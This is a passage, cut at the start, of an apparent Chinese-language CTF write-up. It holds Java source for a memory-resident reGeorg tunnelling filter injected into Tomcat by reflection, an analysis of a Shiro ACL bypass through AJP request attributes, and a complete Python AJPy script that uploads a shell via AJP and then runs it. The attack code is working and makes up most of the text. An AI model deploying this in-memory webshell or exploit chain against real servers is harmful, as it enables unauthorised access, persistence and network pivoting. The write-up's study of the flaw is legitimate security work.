                        socketChannel.connect(new java.net.InetSocketAddress(target, port));
                        socketChannel.configureBlocking(false);
                        session.setAttribute("socket", socketChannel);
                        response.setHeader("X-STATUS", "OK");
                    } catch (java.net.UnknownHostException e) {
                        response.setHeader("X-ERROR", e.getMessage());
                        response.setHeader("X-STATUS", "FAIL");
                    } catch (java.io.IOException e) {
                        response.setHeader("X-ERROR", e.getMessage());
                        response.setHeader("X-STATUS", "FAIL");
                    }
                } else if (cmd.compareTo("DISCONNECT") == 0) {
                    java.nio.channels.SocketChannel socketChannel = (java.nio.channels.SocketChannel)session.getAttribute("socket");
                    try{
                        socketChannel.socket().close();
                    } catch (Exception ex) {
                    }
                    session.invalidate();
                } else if (cmd.compareTo("READ") == 0){
                    java.nio.channels.SocketChannel socketChannel = (java.nio.channels.SocketChannel)session.getAttribute("socket");
                    try {
                        java.nio.ByteBuffer buf = java.nio.ByteBuffer.allocate(512);
                        int bytesRead = socketChannel.read(buf);
                        ServletOutputStream so = response.getOutputStream();
                        while (bytesRead > 0){
                            so.write(buf.array(),0,bytesRead);
                            so.flush();
                            buf.clear();
                            bytesRead = socketChannel.read(buf);
                        }
                        response.setHeader("X-STATUS", "OK");
                        so.flush();
                        so.close();
                    } catch (Exception e) {
                        response.setHeader("X-ERROR", e.getMessage());
                        response.setHeader("X-STATUS", "FAIL");
                    }
                } else if (cmd.compareTo("FORWARD") == 0){
                    java.nio.channels.SocketChannel socketChannel = (java.nio.channels.SocketChannel)session.getAttribute("socket");
                    try {
                        int readlen = request.getContentLength();
                        byte[] buff = new byte[readlen];
                        request.getInputStream().read(buff, 0, readlen);
                        java.nio.ByteBuffer buf = java.nio.ByteBuffer.allocate(readlen);
                        buf.clear();
                        buf.put(buff);
                        buf.flip();
                        while(buf.hasRemaining()) {
                            socketChannel.write(buf);
                        }
                        response.setHeader("X-STATUS", "OK");
                    } catch (Exception e) {
                        response.setHeader("X-ERROR", e.getMessage());
                        response.setHeader("X-STATUS", "FAIL");
                        socketChannel.socket().close();
                    }
                }
            } else {
                filterChain.doFilter(request, response);
            }
        }
        public boolean equals(Object obj) {
            Object[] context=(Object[]) obj;
            this.session = (javax.servlet.http.HttpSession ) context[2];
            this.response = (org.apache.catalina.connector.Response) context[1];
            this.request = (javax.servlet.http.HttpServletRequest) context[0];
            try {
                dynamicAddFilter(new MemReGeorg(),"reGeorg","/*",request);
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            }
            return true;
        }
        public static void dynamicAddFilter(javax.servlet.Filter filter,String name,String url,javax.servlet.http.HttpServletRequest request) throws IllegalAccessException {
            javax.servlet.ServletContext servletContext=request.getServletContext();
            if (servletContext.getFilterRegistration(name) == null) {
                java.lang.reflect.Field contextField = null;
                org.apache.catalina.core.ApplicationContext applicationContext =null;
                org.apache.catalina.core.StandardContext standardContext=null;
                java.lang.reflect.Field stateField=null;
                javax.servlet.FilterRegistration.Dynamic filterRegistration =null;
                try {
                    contextField=servletContext.getClass().getDeclaredField("context");
                    contextField.setAccessible(true);
                    applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);
                    contextField=applicationContext.getClass().getDeclaredField("context");
                    contextField.setAccessible(true);
                    standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);
                    stateField=org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");
                    stateField.setAccessible(true);
                    stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);
                    filterRegistration = servletContext.addFilter(name, filter);
                    filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,new String[]{url});
                    java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class.getMethod("filterStart");
                    filterStartMethod.setAccessible(true);
                    filterStartMethod.invoke(standardContext, null);
                    stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);
                }catch (Exception e){
                    ;
                }finally {
                    stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);
                }
            }
        }
    }
### ajp越权的shiro acl
这一点后面的提示也给出来了，可以用[how-to-detect-tomcat-ajp-lfi-more-accurately](https://gv7.me/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately)提到的办法，也可以用我之前提交的[SHIRO-760](https://issues.apache.org/jira/browse/SHIRO-760)。poc在issue里面已经给了，漏洞的demo环境在[我github](https://github.com/cL0und/srpingboot-shiro)上可以找到，这里借这个机会分享一下当时挖掘的思路。
通过分析前人的文章可以知道，我们可以知道在`org.apache.shiro.web.util.WebUtils#getPathWithinApplication`内部会对requestUri进行提取并交给patchMatches匹配以判断是否需要鉴权。  
多次步入后，可以看到具体的获取uri的实现是其中的`getRequestUri`。`getRequestUri`首先会获取`javax.servlet.include.request_uri`的值如果获取到了就不会进入`if
(uri == null)`。  
而如果有师傅看过shiro上一次对越权的修复的话会发现，补丁是打在`if (uri ==
null)`中的，通过ajp控制`javax.servlet.include.request_uri`相当于绕过上一次的补丁点。  
接着这里提取出来的uri
`/;/admin/page`会进入`decodeAndCleanUriString`中进行清洗。`decodeAndCleanUriString`会取分号前的内容返回。在这里返回的就是`/`，后面shiro的正则`/admin/*`自然也就拦截不了。  
此外，光绕过shiro还不行，spring不解析这条路由也没用，一个开始我以为用前人文章中的
`/xxxx;/../`可以轻松绕过，黑盒测试后发现并不行。分析ajp漏洞的时候我们知道，tomcat会先调用对所有filter进行过滤，然后会调用对应的servlet，而在spring都是统一由`DispatcherServlet`进行统一调度的。所以一开始我选择把断点打到`org.springframework.web.servlet.FrameworkServlet#doGet`（DispatcherServlet继承FrameworkServlet）。又因为spring是通过HandlerMapping来找对应的控制器，所以步入断点之后就开始找哪个地方有这个逻辑。最后在`/org/springframework/web/servlet/DispatcherServlet.class:484`找到。  
步入之后spring把已经注册过Mapping轮询一次。在代码中我们用的`GetMapping`这里就对应`ReuqestMappingHandlerMapping`  
步入`ReuqestMappingHandlerMapping`之后再多次步入，最后来到`org.springframework.web.util.UrlPathHelper#getPathWithinApplication`
这里三个箭头是关键的三个点，第一个箭头会对uri提取并“消杀”，第二个箭头会去`pathWithinApp`中`servletPath`之后的内容。第三个箭头返回`path`交给`HandlerMapping`匹配。  
我们先来看第一个箭头“消杀”的步骤。
上图`removeSemicolonContent`会移除uri中`;`，`/;/admin/page变为//admin/page`。`getSanitizedPath`会对移除重复的`/`，
`//admin/page` 变为 `/admin/page` （ps：这里并不会处理..及.这也是为啥老payload
`/xxx;/../`无法用的原因，虽然可以绕过但是之后spring handlerMapping匹配不到。）
再来第二个箭头，这个`getRemainingPath`会提取处`Uri`中`conextPath`之后的部分。举个反例如果我们把`javax.servlet.include.servlet_path`设置为`/`，那么返回给`HandlerMapping`将会是
`admin/page`
，而`HandlerMapping`只会匹配`/admin/page`这也是为什么`javax.servlet.include.servlet_path`需要置为空的原因。
回过头看漏洞本质还是在于spring和shiro在规范消杀url时标准不一致造成的问题。因为最新版的tomcat已经默认把ajp关了，并且在反代情况下tomcat
8009也不会对外开放所以这个洞的利用还是受很大限制的。
### ajp上传文件
因为网上ajp协议讨论较少，和exp有关的只有CVE-2020-1938，不过payload的构造比较单一并不涉及到上传文件的请求，网上应该也没有介绍相关的文章。那要怎么通过ajp传？我预想的思路是选手通过阅读相关类库来解决比如AJPy，在tomcat.py中提供了一种部署war包getshell的操作，这里面就有上传文件的操作，可以借鉴。  
    import sys
    import os
    from io import BytesIO
    from ajpy.ajp import AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundException
    from tomcat import Tomcat
    target_host = "127.0.0.1"
    gc = Tomcat(target_host, 8009)
    filename = "shell.jpg"
    payload = ""
    with open("/tmp/request", "w+b") as f:
        s_form_header = '------WebKitFormBoundaryb2qpuwMoVtQJENti\r\nContent-Disposition: form-data; name="file"; filename="%s"\r\nContent-Type: application/octet-stream\r\n\r\n' % filename
        s_form_footer = '\r\n------WebKitFormBoundaryb2qpuwMoVtQJENti--\r\n'
        f.write(s_form_header.encode('utf-8'))
        f.write(payload.encode('utf-8'))
        f.write(s_form_footer.encode('utf-8'))
    data_len = os.path.getsize("/tmp/request")
    headers = {
            "SC_REQ_CONTENT_TYPE": "multipart/form-data; boundary=----WebKitFormBoundaryb2qpuwMoVtQJENti",
            "SC_REQ_CONTENT_LENGTH": "%d" % data_len,
    }
    attributes = [
        {
            "name": "req_attribute"
            , "value": ("javax.servlet.include.request_uri", "/;/admin/upload", )
        }
        , {
            "name": "req_attribute"
            , "value": ("javax.servlet.include.path_info", "/", )
        }
        , {
            "name": "req_attribute"
            , "value": ("javax.servlet.include.servlet_path", "", )
        }
    , ]
    hdrs, data = gc.perform_request("/", headers=headers, method="POST",  attributes=attributes)
    with open("/tmp/request", "rb") as f:
        br = AjpBodyRequest(f, data_len, AjpBodyRequest.SERVER_TO_CONTAINER)
        responses = br.send_and_receive(gc.socket, gc.stream)
    r = AjpResponse()
    r.parse(gc.stream)
    shell_path = r.data.decode('utf-8').strip('\x00').split('/')[-1]
    print("="*50)
    print(shell_path)
    print("="*50)
    gc = Tomcat('127.0.0.1', 8009)
    attributes = [
        {"name": "req_attribute", "value": ("javax.servlet.include.request_uri", "/",)},
        {"name": "req_attribute", "value": ("javax.servlet.include.path_info", shell_path,)},
        {"name": "req_attribute", "value": ("javax.servlet.include.servlet_path", "/",)},
    ]
    hdrs, data = gc.perform_request("/uploads/1.jsp", attributes=attributes)
    output = sys.stdout
    for d in data:
        try:
            output.write(d.data.decode('utf8'))
        except UnicodeDecodeError:
            output.write(repr(d.data))